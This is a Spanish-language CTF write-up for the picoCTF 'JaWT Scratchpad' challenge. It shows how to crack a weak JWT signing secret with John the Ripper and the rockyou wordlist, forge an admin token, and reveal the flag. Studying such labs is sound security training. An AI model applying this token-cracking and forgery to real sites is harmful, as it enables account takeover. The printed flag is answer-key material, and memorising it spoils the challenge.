## Descripción 
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

## Datos de Acceso al Nivel
user: carlosof
password:

## Solución
- Ingresamos al link de la pagina, previamente y preferentemente para facilitar el trabajo debemos tener instalada una extensión llamada cookie editor.
- Nos loggamos con un nombre cualquiera, en mi caso Carlos.
- Revisamos las cookies que se han generado, debería aparecer una de jwt.
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIn0.ibA8ZjnNXLYfuOIQWln6-CmmzUhw-bsu3BivkwnNYDk`
- Ahora nos dirigimos a la pagina https://jwt.io/ ahí pegamos la cookie y sustituimos en el user (nuestro nombre) a `admin`, esto nos generara otra cookie diferente, que al momento de cambiarla en la pagina  y recargar nos cargara esto:
```
# Internal Server Error

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```
- Esto se debe a que no podemos modificar la firma solo así como así, ya que desconocemos la password, así que eliminamos la cookie, recargamos la pagina y nos volvemos a loggear.
- Copiamos la cookie y hacemos lo siguiente en kali. 

```bash
┌──(kali㉿kali)-[~]
└─$ nano hash
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ john    
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists 
amass  dirb  dirbuster  dnsmap.txt  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt  sqlmap.txt  wfuzz  wifite.txt
┌──(kali㉿kali)-[~]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:05 DONE (2024-09-23 13:26) 0.1964g/s 1452Kp/s 1452Kc/s 1452KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ 

```
- Ahora sabiendo que la palabra que se uso para firmar ese token es `ilovepico`  la cambiamos en JWT, copiamos la cookie, la pegamos en la pagina, recargamos y obtenemos la bandera.

`picoCTF{jawt_was_just_what_you_thought_44c752f5}`
## Notas Adicionales
- **John the Ripper** (comúnmente conocido como **John**) es una herramienta de recuperación de contraseñas. Su función principal es descifrar contraseñas a partir de hashes. John puede utilizar diferentes métodos, como ataques de diccionario, fuerza bruta y ataques de combinaciones, para intentar descubrir contraseñas.

## Referencias 
https://play.picoctf.org/practice/challenge/25
https://jwt.io/
https://www.openwall.com/john/
